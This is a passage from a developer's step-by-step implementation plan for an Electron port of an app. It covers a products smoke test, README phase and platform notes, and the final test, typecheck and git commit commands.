      const stopped = (await invoke("product_stop", { env: "default", key: svc.key })) as { state: string };
      if (stopped.state !== "stopped") throw new Error(`product_stop: ${JSON.stringify(stopped)}`);
      console.log("ddd: smoke products ok");
```

(`home`, `join`, `mkdirSync`, `writeFileSync`, `invoke` are all already in scope in `smoke()`.) Extend the final ok line so it ends with `…, mcp (consent + probe against a local server), products (declare/approve/start/log/stop), csp enforced`.

Run: `npm run smoke 2>&1 | grep '^ddd:'` — expected: `ddd: smoke products ok` and the extended ok line, exit 0. If any product process is left running after the smoke exits, the smoke's own `product_stop` plus the scratch profile's teardown should prevent it; verify no stray `sleep 30` remains (`pgrep -f "sleep 30"`) and note it in the report.

- [ ] **Step 3: README**

In `README.md`'s phase table, mark phase 6 done with: `Products (declare in .ddd/config.json, approve, start/stop via a login shell into its own process group, captured logs), electron-builder packaging (macOS verified; Windows/Linux configured), Claude Code /todo + recap scripts`. Update the top-of-README status line to say all 71 commands are ported. Under "Platform notes" add: products are macOS/Linux only (Windows is refused, as in the Rust app); packaging produces an unsigned macOS build locally, and signing/notarization plus the Windows and Linux installers are left for a release pipeline.

- [ ] **Step 4: Full verification and commit**

Run: `npm test` and `npm run typecheck` — expected: all green (the live FSEvents watcher tests may print a FAIL and still exit 0 via retry; that is the known artifact — the run's exit code is the gate). Then:

```bash
git add src/main/index.ts README.md src/main/commands.test.ts
git commit -m "feat(main): products smoke, README, and the complete contract — the port is done"
```
